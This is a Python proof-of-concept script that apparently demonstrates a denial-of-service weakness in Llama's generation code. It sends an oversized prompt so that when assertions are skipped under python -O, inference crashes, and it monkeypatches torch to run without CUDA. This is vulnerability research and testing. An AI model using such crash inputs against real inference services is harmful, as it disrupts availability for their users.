# PoC: LlamaAssertDoS.py
import torch
import sys
import os

# Ensure we can import llama
sys.path.append(os.path.abspath("llama"))

# Mock Tokenizer and Model for simulation
class MockTokenizer:
    def __init__(self):
        self.pad_id = 0
        self.eos_id = 1

class MockParams:
    def __init__(self):
        self.max_batch_size = 1
        self.max_seq_len = 10 # Small limit

class MockModel:
    def __init__(self):
        self.params = MockParams()

    def forward(self, x, start_pos):
        # Return dummy logits
        bsz, seqlen = x.shape
        return torch.randn(bsz, seqlen, 100).cuda()

# Import the target class but we need to instantiate it with mocks
from llama.generation import Llama

def test_assert_bypass():
    print("[*] Setting up Llama with max_seq_len=10")
    model = MockModel()
    tokenizer = MockTokenizer()
    llama = Llama(model, tokenizer)

    # Create a prompt longer than max_seq_len
    # 20 tokens > 10
    prompt_tokens = [[i for i in range(20)]]

    print(f"[*] Sending prompt of length {len(prompt_tokens[0])} (Limit: 10)")

    try:
        # Call generate
        # In normal mode, assert should fire.
        # In -O mode, assert is skipped, and it should crash later.
        llama.generate(prompt_tokens, max_gen_len=5, temperature=0.0)
        print("[-] Execution finished without error (Unexpected if assertions skipped and no crash).")
    except AssertionError:
        print("[+] AssertionError caught. Input validation working (Debug mode).")
    except RuntimeError as e:
        print(f"[!] RuntimeError caught: {e}")
        if "shape mismatch" in str(e) or "expanded size" in str(e) or "does not match the size" in str(e):
             print("[!!!] CRASH CONFIRMED: Denial of Service via Assert Bypass.")
             with open("dos_proof.txt", "w") as f:
                 f.write("DoS via Assert Bypass Confirmed")
    except Exception as e:
        print(f"[!] Other exception: {e}")

if __name__ == "__main__":
    if not torch.cuda.is_available():
        print("[-] CUDA not available, mocking cuda")
        # Quick mock for cuda device if needed, but torch.tensor(..., device='cuda') will fail
        # So we need to mock torch.tensor or ensure we use cpu if we modified code.
        # But we cannot modify code for PoC.
        # So we assume the environment has CUDA or we monkeypatch torch.
        pass

    # Monkeypatch torch.cuda.is_available to return True? No, tensor creation will fail.
    # The target code uses `device="cuda"`.
    # We must patch `llama/generation.py`? No, we shouldn't modify target for PoC.
    # We can try to run on CPU if we monkeypatch `torch.tensor`?

    # For this environment, let's see if we have CUDA.
    print(f"CUDA Available: {torch.cuda.is_available()}")

    # If no CUDA, we mock torch.tensor to ignore device='cuda' and return cpu tensor
    if not torch.cuda.is_available():
        original_full = torch.full
        original_tensor = torch.tensor

        def mock_full(*args, **kwargs):
            if 'device' in kwargs: del kwargs['device']
            return original_full(*args, **kwargs)

        def mock_tensor(*args, **kwargs):
            if 'device' in kwargs: del kwargs['device']
            return original_tensor(*args, **kwargs)

        torch.full = mock_full
        torch.tensor = mock_tensor
        torch.cuda.HalfTensor = torch.FloatTensor # Mock HalfTensor

    test_assert_bypass()
